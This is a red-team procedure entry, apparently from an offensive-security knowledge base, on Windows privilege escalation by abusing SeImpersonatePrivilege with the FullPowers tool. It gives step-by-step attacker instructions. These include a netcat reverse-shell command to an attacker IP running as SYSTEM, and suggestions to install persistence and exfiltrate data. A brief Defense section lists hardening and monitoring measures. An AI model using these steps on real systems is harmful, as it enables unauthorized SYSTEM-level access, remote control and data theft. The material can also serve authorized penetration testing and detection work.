---
id: 5ef1ec9e-6fc9-452e-ac97-ea3976f46ace
name: Windows-Restore-Service-Account-Privileges-via-Impersonation
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:30.093571+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tactics:
  - '[[tactics/Privilege Escalation|TA0004 - Privilege Escalation]]'
techniques:
  - '[[techniques/Access Token Manipulation|T1134 - Access Token Manipulation]]'
  - >-
    [[techniques/Token Impersonation/Theft|T1134.001 - Token
    Impersonation/Theft]]
sub_techniques: []
tags:
  - EoP-Impersonation-Privileges
  - Restore-Service-Account-Privileges
  - Windows-Privilege-Escalation
  - impersonation
  - privilege-escalation
commands:
  - '[[commands/fullpowers-launch-basic-shell]]'
  - '[[commands/fullpowers-execute-command-new-process]]'
platforms:
  - Windows
tools:
  - '[[tools/FullPowers]]'
validated: true
---

# Windows-Restore-Service-Account-Privileges-via-Impersonation

## Summary

This procedure demonstrates how to restore or leverage a service account's elevated privileges on a Windows system through impersonation using the FullPowers tool. By abusing the SeImpersonatePrivilege often held by service accounts, an attacker can impersonate higher-privileged contexts to execute commands as SYSTEM, enabling privilege escalation, access to sensitive resources, or lateral movement.

## Description

Service accounts on Windows are configured with specific privileges to perform automated tasks, such as SeImpersonatePrivilege, which allows impersonation of authenticated clients. Attackers who compromise a user or process with access to such a service account can use tools like FullPowers to duplicate the security token and create a new process with elevated privileges. This technique is particularly effective in environments where service accounts have been weakened or where direct admin access is limited. The procedure targets Windows systems (e.g., Windows 10/Server 2019+), assuming initial foothold via a low-priv user. Success results in a SYSTEM-level shell, allowing restoration of privileges for persistence or further exploitation. Note: This requires SeImpersonatePrivilege to be enabled in the current token.

## Requirements

1. Compromised access to a Windows system with a user context that has SeImpersonatePrivilege (common for service accounts or mid-level users).
2. FullPowers tool downloaded and placed in an accessible path (e.g., C:\TOOLS\).
3. Administrative or service account context on the target system; no full admin rights needed initially.
4. Optional: Listener setup (e.g., netcat) for reverse shells if executing remote commands.

## Defense

- Limit service account privileges to the minimum required (e.g., disable unnecessary privileges like SeImpersonatePrivilege via Group Policy).
- Monitor for suspicious activity, such as unusual logons (Event ID 4624), token manipulations (Event ID 4672/4673), or scheduled task creations (Event ID 4698).
- Implement multi-factor authentication (MFA) for service accounts and enable Protected Users group to restrict delegation.
- Use tools like Sysmon for logging process creations with parent-child relationships and privilege changes.
- Regularly audit service account configurations and rotate credentials.

## Objectives

1. Impersonate a service account to restore or gain elevated privileges (e.g., SYSTEM level).
2. Escalate privileges on a compromised Windows system for deeper access.
3. Enable lateral movement or persistence by executing commands in an elevated context.

## Instructions

### Step 1: Launch FullPowers for Basic Impersonation

**Context**: Start FullPowers to create a duplicated token with impersonation privileges and spawn an elevated shell. This step verifies the tool's functionality and lists available privileges to confirm elevation potential. Why: It establishes the impersonated context without immediately executing payloads, allowing safe testing.

**Command** ([[commands/fullpowers-launch-basic-shell]]):

```cmd
FullPowers
```

> This command initiates FullPowers, which creates a scheduled task to trigger impersonation and spawns a new cmd.exe as the impersonated user. Expected output includes confirmation of token creation and a new shell prompt at C:\WINDOWS\system32>. If successful, run `whoami /priv` to verify enabled privileges like SeImpersonatePrivilege.

### Step 2: Execute Elevated Command in New Process

**Context**: Use FullPowers to run a specific command (e.g., reverse shell) in a new process with the impersonated token. This isolates the execution and restores full service account privileges for the payload. Why: The -z flag ensures a clean token for the child process, preventing inheritance issues and enabling actions like remote execution.

**Command** ([[commands/fullpowers-execute-command-new-process]]):

```cmd
FullPowers -c "C:\TOOLS\nc64.exe 1.2.3.4 1337 -e cmd" -z
```

> Replace the command with your payload (e.g., netcat reverse shell to attacker IP 1.2.3.4 on port 1337). Expected output: Confirmation of process creation and execution. On success, the listener receives a SYSTEM shell. Verify by checking the remote connection and running `whoami` to confirm elevated context.

### Step 3: Verify and Leverage Elevated Access

**Context**: In the elevated shell, confirm privileges and perform actions like reading sensitive files or installing persistence. Why: Validates the impersonation succeeded and allows exploitation of restored privileges.

**Command** (standard Windows command, no custom link):

```cmd
whoami /priv
```

> Expected output: List of enabled privileges, including SeImpersonatePrivilege, SeAssignPrimaryTokenPrivilege, etc. Use this access to restore service account configs if needed (e.g., via `sc` commands) or exfiltrate data.
